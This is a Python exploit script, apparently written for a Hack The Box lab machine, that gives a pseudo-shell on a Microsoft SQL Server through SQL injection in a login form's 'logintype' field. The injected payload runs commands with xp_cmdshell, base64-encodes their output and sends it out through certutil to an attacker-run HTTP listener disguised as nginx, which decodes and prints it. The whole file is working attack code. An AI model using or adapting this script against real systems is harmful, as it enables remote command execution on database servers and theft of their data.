import sys
import requests
import threading
import base64
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, HTTPServer

'''
Description: Reverse MSSQL shell through xp_cmdshell + certutil for exfiltration
Author: @xassiz
Modified by: @s0j0hn
'''
query_id = 0


def decode(data):
    parser = HTMLParser()
    try:
        # We don't like Unicode strings, do we?
        print(data)
        decoded_data = base64.b64decode(data)
    except:
        return '[-] decoding error'
    return decoded_data.decode('utf8', errors='ignore')


def get_command():
    try:
        cmd = input(':\> ')
        t = threading.Thread(target=send_command, args=(cmd,))
        t.start()
    except:
        sys.exit(0)


def send_command(cmd):
    global target_url, local_url

    payload = '''
    2;
    declare @r varchar(6120),@cmdOutput varchar(6120);
    declare @res TABLE(line varchar(max));
    insert into @res exec Xp_cmdshell %s;
    set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')),
     1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
    set @r=concat('certutil -urlcache -f http://10.10.14.24/',@cmdOutput);
    exec Xp_cmdshell @r;
    --
    '''

    # Data for login
    login = {
        'B1': 'LogIn',
        # 'logintype': "1 AND ISNULL(ASCII(SUBSTRING((SELECT @@version LIMIT 0,1)),"+str(limit)+",1)),0)>"+str(char),
        'logintype': payload % (cmd),
        'username': "admin",
        'rememberme': 'ON',
        'password': "admin",
    }

    requests.post("http://members.streetfighterclub.htb/old/verify.asp", data=login)


class MyServer(HTTPServer):
    def server_activate(self):
        # get first command
        get_command()
        HTTPServer.server_activate(self)


class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, *args, **kwargs):
        return

    def log_message(self, *args, **kwargs):
        return

    def do_GET(self):
        global query_id
        self.send_error(404)

        # Certutil sends 2 requets each time
        if query_id % 2 == 0:
            output = self.path

            # if command output, decode it!
            if output != '/':
                print(decode(output[1:]))

            # get next command
            get_command()

        query_id += 1


if __name__ == '__main__':
    # Fake server behaviour
    handler = SimpleHTTPRequestHandler
    handler.server_version = 'nginx'
    handler.sys_version = ''
    handler.error_message_format = 'not found'

    # Add SSL support if you wanna be a ninja!
    httpd = MyServer(('0.0.0.0', 80), handler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
